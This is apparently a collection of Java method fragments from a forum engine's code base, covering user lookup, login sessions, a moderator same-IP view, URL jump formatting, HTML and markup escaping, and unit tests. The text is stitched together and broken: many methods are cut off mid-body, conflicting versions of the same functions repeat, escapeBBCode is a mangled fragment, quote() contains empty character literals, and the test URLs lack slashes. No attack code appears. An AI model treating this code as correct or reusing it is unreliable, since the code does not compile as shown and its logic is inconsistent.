public void removeVariant ( PollVariant variant ) { jdbcTemplate . update ( " DELETE FROM votes WHERE id=? " , variant . getId ( ) ) ; } 
public void performLogin ( HttpServletResponse response , User user ) { session . setAttribute ( " login " , Boolean . TRUE ) ; session . setAttribute ( " nick " , user . getNick ( ) ) ; session . setAttribute ( " moderator " , user . canModerate ( ) ) ; session . setAttribute ( " corrector " , user . canCorrect ( ) ) ; userDao . updateLastlogin ( user ) ; user . acegiSecurityHack ( response , session ) ; currentUser = user ; } 
public void init ( FilterConfig filterConfig ) throws ServletException { this . filterConfig = filterConfig ; WebApplicationContext ctx = WebApplicationContextUtils . getWebApplicationContext ( filterConfig . getServletContext ( ) ) ; properties = ( Properties ) ctx . getBean ( " properties " ) ; userDao = ( UserDao ) ctx . getBean ( " userDao " ) ; MemCachedSettings . setMainUrl ( properties . getProperty ( " MainUrl " ) ) ; } 
public void doFilter ( ServletRequest servletRequest , ServletResponse servletResponse , FilterChain filterChain ) throws ServletException , IOException { if ( filterConfig = = null ) { return ; } try { Template tmpl = new Template ( ( HttpServletRequest ) servletRequest , properties , ( HttpServletResponse ) servletResponse , userDao ) ; servletRequest . setAttribute ( " template " , tmpl ) ; } catch ( Exception ex ) { logger . fatal ( " Can't build Template " , ex ) ; return ; } filterChain . doFilter ( servletRequest , servletResponse ) ; } 
public User getUser ( String nick ) throws UserNotFoundException { if ( nick = = null ) { throw new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { throw new UserNotFoundException ( " <invalid name> " ) ; } Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; List < User > list = jdbcTemplate . query ( " SELECT id,nick,candel,canmod,corrector,passwd,blocked,score,max_score,activated,photo,email,name,unread_events FROM users where nick=? " , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new User ( rs ) ; } } , nick ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } User user = list . get ( 0 ) ; String cacheId = " User?id= " + user . getId ( ) ; cache . put ( new Element ( cacheId , user ) ) ; return user ; } 
public User getUserCached ( int id ) throws UserNotFoundException { return getUser ( id , true ) ; } 
public User getUser ( int id ) throws UserNotFoundException { return getUser ( id , false ) ; } 
private User getUser ( int id , boolean useCache ) throws UserNotFoundException { Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; String cacheId = " User?id= " + id ; User res = null ; if ( useCache ) { Element element = cache . get ( cacheId ) ; if ( element ! = null ) { res = ( User ) element . getObjectValue ( ) ; } } if ( res = = null ) { List < User > list = jdbcTemplate . query ( " SELECT id, nick,score, max_score, candel,canmod,corrector,passwd,blocked,activated,photo,email,name,unread_events FROM users where id=? " , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new User ( rs ) ; } } , id ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } res = list . get ( 0 ) ; cache . put ( new Element ( cacheId , res ) ) ; } return res ; } 
public void updateLastlogin ( User user ) { jdbcTemplate . update ( " UPDATE users SET lastlogin=CURRENT_TIMESTAMP WHERE id=? " , user . getId ( ) ) ; } 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } String ip ; ModelAndView mv = new ModelAndView ( " sameip " ) ; int userAgentId = 0 ; if ( msgid ! = null ) { SqlRowSet rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM topics WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM comments WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { throw new MessageNotFoundException ( msgid ) ; } } ip = rs . getString ( " postip " ) ; userAgentId = rs . getInt ( " ua_id " ) ; if ( ip = = null ) { throw new ScriptErrorException ( " No IP data for # " + msgid ) ; } } else { ip = ServletParameterParser . getIP ( request , " ip " ) ; } mv . getModel ( ) . put ( " ip " , ip ) ; mv . getModel ( ) . put ( " uaId " , userAgentId ) ; mv . getModel ( ) . put ( " topics " , getTopics ( ip ) ) ; mv . getModel ( ) . put ( " comments " , getComments ( ip ) ) ; mv . getModel ( ) . put ( " users " , getUsers ( ip , userAgentId ) ) ; IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; if ( blockInfo ! = null ) { mv . getModel ( ) . put ( " blockInfo " , blockInfo ) ; mv . getModel ( ) . put ( " blockModerator " , userDao . getUserCached ( blockInfo . getModerator ( ) ) ) ; } mv . getModel ( ) . put ( " tor " , IPBlockDao . getTor ( ip ) ) ; return mv ; } 
public TopicItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new TopicItem ( rs , false ) ; } 
public TopicItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new TopicItem ( rs , true ) ; } 
public UserItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new UserItem ( rs , uaId ) ; } 
public ModelAndView serverInfo ( ) { List < User > moderators = userDao . getModerators ( ) ; ModelAndView mv = new ModelAndView ( " server " ) ; mv . getModel ( ) . put ( " moderators " , moderators ) ; List < User > correctors = userDao . getCorrectors ( ) ; mv . getModel ( ) . put ( " correctors " , correctors ) ; return mv ; } 
public void processRow ( ResultSet rs ) throws SQLException { tags . add ( rs . getString ( " value " ) ) ; } 
public boolean updateTags ( final int msgid , final List < String > tagList ) { final List < String > oldTags = getMessageTags ( msgid ) ; return jdbcTemplate . execute ( new ConnectionCallback < Boolean > ( ) { @Override 
public Boolean doInConnection ( Connection con ) throws SQLException , DataAccessException { PreparedStatement insertStatement = con . prepareStatement ( " INSERT INTO tags VALUES(?,?) " ) ; PreparedStatement deleteStatement = con . prepareStatement ( " DELETE FROM tags WHERE msgid=? and tagid=? " ) ; insertStatement . setInt ( 1 , msgid ) ; deleteStatement . setInt ( 1 , msgid ) ; boolean modified = false ; for ( String tag : tagList ) { if ( ! oldTags . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; insertStatement . setInt ( 2 , id ) ; insertStatement . executeUpdate ( ) ; modified = true ; } } for ( String tag : oldTags ) { if ( ! tagList . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; deleteStatement . setInt ( 2 , id ) ; deleteStatement . executeUpdate ( ) ; modified = true ; } } insertStatement . close ( ) ; deleteStatement . close ( ) ; return modified ; } 
public ModelAndView register ( @ModelAttribute ( " form " ) RegisterRequest form , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { User user = tmpl . getCurrentUser ( ) ; 
public void testGetRequest ( ) { assertEquals ( " news/debian/6753486#comment-6753612 " , URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ) ) ; assertEquals ( " forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ) ) ; assertEquals ( " news/debian/6753486#comment-6753612 " , URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ) ) ; assertEquals ( " forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ) ) ; assertEquals ( " forum/talks/6893165?lastmod=1319027964738 " , URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " ) ) ; assertEquals ( " forum/talks/6893165?lastmod=1319027964738 " , URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " ) ) ; 
public void testGetMessageId ( ) { assertEquals ( 6753486 , URLUtil . getMessageIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ) ) ) ; assertEquals ( 6753486 , URLUtil . getMessageIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ) ) ) ; assertEquals ( 6890857 , URLUtil . getMessageIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ) ) ) ; assertEquals ( 6890857 , URLUtil . getMessageIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ) ) ) ; assertEquals ( 6893165 , URLUtil . getMessageIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " ) ) ) ; 
public void testGetCommentId ( ) { assertEquals ( 6753612 , URLUtil . getCommentIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ) ) ) ; assertEquals ( 6753612 , URLUtil . getCommentIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ) ) ) ; assertEquals ( 6892917 , URLUtil . getCommentIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ) ) ) ; assertEquals ( 6892917 , URLUtil . getCommentIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ) ) ) ; assertEquals ( 0 , URLUtil . getCommentIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " ) ) ) ; 
public PreparedComment prepareComment ( Comment comment , boolean secure ) throws UserNotFoundException { return prepareComment ( comment , ( CommentList ) null , secure ) ; } 
public PreparedComment prepareComment ( Comment comment , String message , boolean secure ) throws UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parser ( message , secure ) ; return new PreparedComment ( comment , author , processedMessage , null ) ; } 
public List < PreparedComment > prepareCommentList ( CommentList comments , List < Comment > list , boolean secure ) throws UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( prepareComment ( comment , comments , secure ) ) ; } return commentsPrepared ; } 
public String mapRow ( ResultSet resultSet , int i ) throws SQLException { String text = resultSet . getString ( " message " ) ; boolean isLorcode = resultSet . getBoolean ( " bbcode " ) ; if ( isLorcode ) { return lorCodeService . parser ( text , secure ) ; 
private static String cropSchemeFromUrl ( String url ) { String newUrl ; if ( url . startsWith ( " http: " ) ) { newUrl = url . substring ( 8 ) ; } else if ( url . startsWith ( " https: " ) ) { newUrl = url . substring ( 9 ) ; } else { newUrl = url ; } return newUrl ; } 
public static String formatLorUrl ( String mainUrl , int msgid , int cid , boolean secure ) { if ( msgid = = 0 | | cid = = 0 | | " " . equals ( mainUrl ) ) { return " " ; } String cropMainUrl = cropSchemeFromUrl ( mainUrl ) ; String scheme ; if ( secure ) { scheme = " https: " ; } else { scheme = " http: " ; } return String . format ( " %s%s/jump-message.jsp?msgid=%d&cid=%d " , scheme , mainUrl , msgid , cid ) ; } 
public static boolean isSecureUrl ( String url ) { return url . startsWith ( " https: " ) ; } 
public String parser ( String text ) { return parser ( text , true , true , " " , false ) ; } 
public String parser ( String text , boolean secure ) { return parser ( text , true , true , " " , secure ) ; } 
public String parser ( String text , boolean renderCut , boolean cleanCut , String cutUrl , boolean secure ) { return defaultParser . parseRoot ( prepareRootNode ( renderCut , cleanCut , cutUrl , secure ) , text ) . renderXHtml ( ) ; } 
public ParserResult parserWithReplies ( String text ) { return parserWithReplies ( text , true , true , " " , false ) ; } 
public ParserResult parserWithReplies ( String text , boolean secure ) { return parserWithReplies ( text , true , true , " " , secure ) ; } 
public ParserResult parserWithReplies ( String text , boolean renderCut , boolean cleanCut , String cutUrl , boolean secure ) { RootNode parsedRootNode = defaultParser . parseRoot ( prepareRootNode ( renderCut , cleanCut , cutUrl , secure ) , text ) ; return new ParserResult ( parsedRootNode . renderXHtml ( ) , parsedRootNode . getReplier ( ) ) ; } 
private RootNode prepareRootNode ( boolean renderCut , boolean cleanCut , String cutUrl , boolean secure ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( userDao ) ; rootNode . setConfiguration ( configuration ) ; rootNode . setSecure ( secure ) ; return rootNode ; } 
public RootNode parseRoot ( RootNode rootNode , String text ) { return parse ( rootNode , text ) ; } 
private static String cropSchemeFromUrl ( String url ) { String newUrl ; if ( url . startsWith ( " http: " ) ) { newUrl = url . substring ( 7 ) ; } else if ( url . startsWith ( " https: " ) ) { newUrl = url . substring ( 8 ) ; } else { newUrl = url ; } return newUrl ; } 
public static String formatLorUrl ( String mainUrl , int msgid , int cid , boolean secure ) { if ( msgid = = 0 | | cid = = 0 | | " " . equals ( mainUrl ) ) { return " " ; } String cropMainUrl = cropSchemeFromUrl ( mainUrl ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } return String . format ( " %s:%sjump-message.jsp?msgid=%d&cid=%d " , scheme , cropMainUrl , msgid , cid ) ; } 
private RootNode prepareRootNode ( boolean renderCut , boolean cleanCut , String cutUrl , boolean secure ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( userDao ) ; rootNode . setMessageDao ( messageDao ) ; rootNode . setConfiguration ( configuration ) ; rootNode . setSecure ( secure ) ; return rootNode ; } 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , Section . SECTION_FORUM , groupName , msgid , cid ) ; } return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , Section . SECTION_NEWS , groupName , msgid , cid ) ; } return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " highlight " , required = false ) Set < Integer > highlight ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , Section . SECTION_POLLS , groupName , msgid , cid ) ; } return getMessageNew ( Section . SECTION_POLLS , 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , Section . SECTION_GALLERY , groupName , msgid , cid ) ; } return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewNewsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , page , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewPollsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , page , filter , groupName , msgid , null ) ; } 
public Group getGroup ( Message message ) throws BadGroupException { return groupDao . getGroup ( message . getGroupId ( ) ) ; } 
public static String formatJumpUrl ( String mainUrl , Group group , int msgid , int cid , boolean secure ) throws Exception { String groupUrl = group . getUrl ( ) ; if ( msgid = = 0 | | cid = = 0 | | " " . equals ( mainUrl ) ) { return " " ; } String cropMainUrl = cropSchemeFromUrl ( mainUrl ) ; if ( cropMainUrl . endsWith ( " / " ) ) { cropMainUrl = cropMainUrl . substring ( 0 , cropMainUrl . length ( ) - 1 ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } return String . format ( " %s:%s%s%d?cid=%d " , scheme , cropMainUrl , groupUrl , msgid , cid ) ; } 
public static String formatJumpUrl ( String mainUrl , Group group , int msgid , int cid , boolean secure ) throws Exception { String groupUrl = group . getUrl ( ) ; if ( msgid = = 0 | | " " . equals ( mainUrl ) ) { return " " ; } String cropMainUrl = cropSchemeFromUrl ( mainUrl ) ; if ( cropMainUrl . endsWith ( " / " ) ) { cropMainUrl = cropMainUrl . substring ( 0 , cropMainUrl . length ( ) - 1 ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } if ( cid ! = 0 ) { return String . format ( " %s:%s%s%d?cid=%d " , scheme , cropMainUrl , groupUrl , msgid , cid ) ; 
public boolean isTrueLorUrl ( ) { return isTrueLorUrl ; } 
public boolean isMessageUrl ( ) { return isMessageUrl ; } 
public boolean isCommentUrl ( ) { return isCommentUrl ; } 
public String fixScheme ( boolean secure ) throws URIException { String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = lorUri . getHost ( ) ; int port = lorUri . getPort ( ) ; String path = lorUri . getPath ( ) ; String query = lorUri . getQuery ( ) ; String fragment = lorUri . getFragment ( ) ; URI fixUri = new URI ( scheme , null , host , port , path , query , fragment ) ; return fixUri . getEscapedURI ( ) ; } 
public String formatJump ( MessageDao messageDao , boolean secure ) throws MessageNotFoundException , BadGroupException , URIException { if ( isMessageUrl ) { Message message = messageDao . getById ( messageId ) ; Group group = messageDao . getGroup ( message ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = mainUri . getHost ( ) ; int port = mainUri . getPort ( ) ; String path = group . getUrl ( ) + messageId ; String query = " " ; if ( isCommentUrl ( ) ) { query = " cid= " + commentId ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public void initTest ( ) throws Exception { messageDao = mock ( MessageDao . class ) ; message1 = mock ( Message . class ) ; group1 = mock ( Group . class ) ; message2 = mock ( Message . class ) ; group2 = mock ( Group . class ) ; message3 = mock ( Message . class ) ; group3 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . thenReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . thenReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . thenReturn ( " /forum/general/ " ) ; when ( messageDao . getGroup ( message1 ) ) . thenReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . thenReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . thenReturn ( group3 ) ; when ( messageDao . getById ( 6753486 ) ) . thenReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . thenReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . thenReturn ( message3 ) ; } 
public void test1 ( ) throws Exception { LorURI lorURI = new LorURI ( mainUrl , url1 ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test2 ( ) throws Exception { LorURI lorURI = new LorURI ( mainUrl , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test3 ( ) throws Exception { LorURI lorURI = new LorURI ( mainUrl , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test4 ( ) throws Exception { LorURI lorURI = new LorURI ( mainUrl , url4 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test5 ( ) throws Exception { LorURI lorURI = new LorURI ( mainUrl , url5 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test6 ( ) throws Exception { LorURI lorURI = new LorURI ( mainUrl , url6 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; assertEquals ( " http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( true ) ) ; } 
public void test7 ( ) throws Exception { LorURI lorURI = new LorURI ( mainUrl , url6 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; assertEquals ( " http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( true ) ) ; } 
private String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; 
String processMessage ( String msg , String mode ) { if ( msg = = null ) { return " " ; } if ( " lorcode " . equals ( mode ) ) { return msg ; 
public String process ( ) { String str ; if ( outputLorcode ) { str = text . replaceAll ( " \\ [(/?code) \\ ] " , " [[$1]] " ) ; str = escapeHtmlBBcode(text); } else { str = StringUtil.escapeHtml(text); } StringTokenizer st = new StringTokenizer(str, " ", true); StringBuilder sb = new StringBuilder(); while (st.hasMoreTokens()) { sb.append(formatHTMLLine(st.nextToken())); } String res = sb.toString(); if (newLine) { res = nl2br(res, quoting, outputLorcode); } if (texNewLine) { res = texnl2br(res, quoting, outputLorcode); } return res; } 
public String fixScheme ( boolean secure ) throws URIException { if ( ! isTrueLorUrl ) { return " " ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = lorUri . getHost ( ) ; int port = lorUri . getPort ( ) ; String path = lorUri . getPath ( ) ; String query = lorUri . getQuery ( ) ; String fragment = lorUri . getFragment ( ) ; URI fixUri = new URI ( scheme , null , host , port , path , query , fragment ) ; return fixUri . getEscapedURI ( ) ; } 
public static String escapeHtml ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; res . append ( s ) ; i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . toString ( ) ; } 
public static String escapeBBCode ( String content ) { ".toCharArray(), new String[]{ "&#91;", "&#93;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public static String escape ( String html ) { return StringUtil . escapeHtml ( html ) ; } 
public String format ( String text , boolean quoting ) { String newText = text . replaceAll ( " \\ [(/?code) \\ ] " , " [[$1]] " ) ; StringTokenizer st = new StringTokenizer ( newText , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatLine ( st . nextToken ( ) ) ) ; } String formattedLine = sb . toString ( ) ; if ( quoting ) { return quote ( formattedLine ) ; 
private String fixNL ( String text ) { return text . replaceAll ( NL_PATTERN , " [br] " ) ; } 
private String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " [/i] " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " > " ) ) { quot = true ; buf . append ( " [i] " ) ; } if ( text . charAt ( i ) = = '' ) { buf . append ( " [br] " ) ; } } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " [/i] " ) ; } return buf . toString ( ) ; } 
public String format ( String text , boolean quoting ) { String newText = text . replaceAll ( " \\ [(/?code) \\ ] " , " [[$1]] " ) ; StringTokenizer st = new StringTokenizer ( newText , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatLine ( st . nextToken ( ) ) ) ; } String formattedLine = sb . toString ( ) ; if ( quoting ) { return quote ( formattedLine ) ; 
private String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " [/i] " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " > " ) ) { quot = true ; buf . append ( " n[i] " ) ; } } else { cr = true ; } } else { cr = false ; } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " [/i] " ) ; } return buf . toString ( ) ; } 
public void testStringEscape ( ) { String str = " This is an entity &#1999; " ; String s = StringUtil . escapeHtml ( str ) ; assertThat ( " String should remaint unescaped " , s , CoreMatchers . equalTo ( str ) ) ; } 
public void testAmpEscape ( ) { String str = " a&b " ; String s = StringUtil . escapeHtml ( str ) ; assertThat ( " Ampersand should be escaped " , s , CoreMatchers . equalTo ( " a&amp;b " ) ) ; } 
